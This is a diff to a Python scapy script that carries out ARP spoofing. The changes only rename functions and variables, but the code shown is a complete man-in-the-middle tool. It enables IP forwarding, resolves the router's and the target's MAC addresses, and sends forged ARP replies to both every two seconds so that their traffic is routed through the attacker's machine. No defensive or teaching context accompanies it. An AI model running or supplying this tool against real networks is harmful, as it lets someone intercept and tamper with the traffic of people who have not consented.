@@ -5,7 +5,7 @@ import time
 from scapy.layers.l2 import Ether, ARP
 from scapy.sendrecv import srp, send
 
-def ipforward(constant):
+def ip_forward(constant):
     change = "Enabled" if constant else "Disabled"
     try:
         if platform.system() == "Darwin":
@@ -21,7 +21,7 @@ def ipforward(constant):
         print(f"\n[!] error: {error}\n")
         sys.exit()
 
-def macadr(ipadr):
+def mac_adr(ipadr):
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
     arp = ARP(pdst=ipadr)
     packet = broadcast / arp
@@ -31,25 +31,25 @@ def macadr(ipadr):
         return result[0][1].hwsrc
     else:
         print(f"\n[0] error: {ipadr} [IA]\n")
-        ipforward(0)
+        ip_forward(0)
         sys.exit()
 
-def spoof(router, target, adrRouter, adrTarget):
-    routerPacket = ARP(op=2, hwdst=adrRouter, pdst=router, psrc=target)
-    send(routerPacket)
-    targetPacket = ARP(op=2, hwdst=adrTarget, pdst=target, psrc=router)
-    send(targetPacket)
+def spoof(ip_router, ip_target, adr_router, adr_target):
+    router_packet = ARP(op=2, hwdst=adr_router, pdst=ip_router, psrc=ip_target)
+    send(router_packet)
+    target_packet = ARP(op=2, hwdst=adr_target, pdst=ip_target, psrc=ip_router)
+    send(target_packet)
 
 try:
-    ipforward(1)
+    ip_forward(1)
     router = input("\n[?] router: ")
     target = input("[?] target: ")
-    adrRouter = str(macadr(router))
-    adrTarget = str(macadr(target))
+    adrRouter = str(mac_adr(router))
+    adrTarget = str(mac_adr(target))
     while True:
         spoof(router, target, adrRouter, adrTarget)
         time.sleep(2.0)
 except KeyboardInterrupt:
     print("\n[0]")
-    ipforward(0)
+    ip_forward(0)
     sys.exit()
